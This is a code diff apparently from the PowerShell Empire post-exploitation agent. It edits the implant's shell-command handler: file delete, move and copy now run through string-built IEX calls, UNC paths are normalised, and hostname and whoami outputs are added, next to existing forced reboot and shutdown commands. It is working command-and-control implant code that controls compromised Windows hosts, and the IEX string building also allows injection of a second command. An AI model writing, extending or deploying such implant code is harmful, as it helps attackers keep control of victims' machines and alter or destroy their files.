@@ -239,9 +239,12 @@ function Invoke-Empire {
     function Invoke-ShellCommand {
         param($cmd, $cmdargs="")
 
-        if ($cmdargs.StartsWith("\\")) {
-            # UNC path normalization for PowerShell
-            $cmdargs = "FileSystem::$cmdargs"
+        # UNC path normalization for PowerShell
+        if ($cmdargs -like "*`"\\*") {
+            $cmdargs = $cmdargs -replace "`"\\","FileSystem::`"\"
+        }
+        elseif ($cmdargs -like "*\\*") {
+            $cmdargs = $cmdargs -replace "\\\\","FileSystem::\\"
         }
 
         $output = ""
@@ -258,46 +261,18 @@ function Invoke-Empire {
                     }
                     else {
                         try{
-                            $output = Get-ChildItem -force -path "$cmdargs" -ErrorAction Stop | select lastwritetime,length,name
+                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select lastwritetime,length,name"
                         }
                         catch [System.Management.Automation.ActionPreferenceStopException] {
                             $output = "[!] Error: $_ (or cannot be accessed)."
                         }
                     }
                 }
-                '(rm|del|rmdir)' { 
+                '(mv|move|copy|cp|rm|del|rmdir)' {
                     if ($cmdargs.length -ne "") { 
                         try {
-                            Remove-Item -Force -Recurse "$cmdargs" -ErrorAction Stop;
-                            $output = "$cmdargs deleted"
-                        } 
-                        catch {
-                            $output=$_.Exception;
-                        }
-                    }
-                }
-                '(mv|move)' {
-                    if ($cmdargs.length -ne "") { 
-                        try {
-                            $parts = $cmdargs.split(" ")
-                            $source = $parts[0..$($parts.length-2)] -join " "
-                            $dest = $parts[-1]
-                            Move-Item -LiteralPath $source -Destination $dest -Force -ErrorAction Stop
-                            $output = "$source moved to $dest"
-                        } 
-                        catch {
-                            $output=$_.Exception;
-                        }
-                    }                    
-                }
-                '(copy|cp)' {
-                    if ($cmdargs.length -ne "") { 
-                        try {
-                            $parts = $cmdargs.split(" ")
-                            $source = $parts[0..$($parts.length-2)] -join " "
-                            $dest = $parts[-1]
-                            Copy-Item -LiteralPath $source -Destination $dest -Force -ErrorAction Stop
-                            $output = "$source copied to $dest"
+                            IEX "$cmd $cmdargs -Force -ErrorAction Stop"
+                            $output = "executed $cmd $cmdargs"
                         } 
                         catch {
                             $output=$_.Exception;
@@ -306,8 +281,9 @@ function Invoke-Empire {
                 }
                 cd { 
                     if ($cmdargs.length -ne "")
-                    { 
-                        cd $cmdargs
+                    {
+                        $cmdargs = $cmdargs.trim("`"").trim("'")
+                        cd "$cmdargs"
                         $output = pwd
                     }
                 }
@@ -383,7 +359,10 @@ function Invoke-Empire {
                     }
                     else { $output = route $cmdargs }
                 }
-                '(whoami|getuid)' { [Security.Principal.WindowsIdentity]::GetCurrent().Name }
+                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name }
+                hostname {
+                    $output = [System.Net.Dns]::GetHostByName(($env:computerName))
+                }
                 '(reboot|restart)' { Restart-Computer -force }
                 shutdown { Stop-Computer -force }
                 default {
